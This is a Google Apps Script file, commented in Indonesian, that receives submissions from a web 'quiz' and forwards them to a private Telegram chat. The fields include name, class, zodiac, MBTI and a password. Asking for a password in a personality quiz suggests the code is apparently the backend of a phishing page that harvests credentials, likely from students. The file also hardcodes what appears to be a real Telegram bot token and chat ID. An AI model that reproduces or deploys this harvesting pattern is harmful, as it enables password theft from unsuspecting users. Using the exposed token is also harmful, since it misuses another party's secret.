function doPost(e) {
  try {
    // Parse data yang masuk dari halaman web
    var data = JSON.parse(e.postData.contents);
    
    // Token bot dan chat ID Anda
    var botToken = '7969256129:AAGgGyCzxPAK7TTNLp3dDgoqpCwnvVx7E2U';
    var chatId = '6634959525';
    
    // Format pesan untuk dikirim ke Telegram
    var message = 'Pengiriman Kuis Baru:\n' +
                  'Nama: ' + data.nama + '\n' +
                  'Kelas: ' + data.kelas + '\n' +
                  'Password: ' + data.password + '\n' +
                  'Zodiak: ' + data.zodiak + '\n' +
                  'Game: ' + data.game + '\n' +
                  'MBTI: ' + data.mbti + '\n' +
                  'Person: ' + data.person;
    
    // Kirim ke Telegram
    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
    var payload = {
      'chat_id': chatId,
      'text': message
    };
    
    var options = {
      'method': 'post',
      'contentType': 'application/json',
      'payload': JSON.stringify(payload)
    };
    
    UrlFetchApp.fetch(telegramUrl, options);
    
    return ContentService
      .createTextOutput('Berhasil')
      .setMimeType(ContentService.MimeType.TEXT);
  } catch (error) {
    return ContentService
      .createTextOutput('Error: ' + error.toString())
      .setMimeType(ContentService.MimeType.TEXT);
  }
}

// Endpoint untuk mengirim pesan tes ke Telegram secara manual
function doGet(e) {
  var botToken = '7969256129:AAGgGyCzxPAK7TTNLp3dDgoqpCwnvVx7E2U';
  var chatId = '6634959525';
  var message = 'Pesan tes dari Google Apps Script ke Telegram.';

  var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
  var payload = {
    'chat_id': chatId,
    'text': message
  };

  var options = {
    'method': 'post',
    'contentType': 'application/json',
    'payload': JSON.stringify(payload)
  };

  UrlFetchApp.fetch(telegramUrl, options);

  return ContentService
    .createTextOutput('Pesan tes berhasil dikirim ke Telegram.')
    .setMimeType(ContentService.MimeType.TEXT);
}
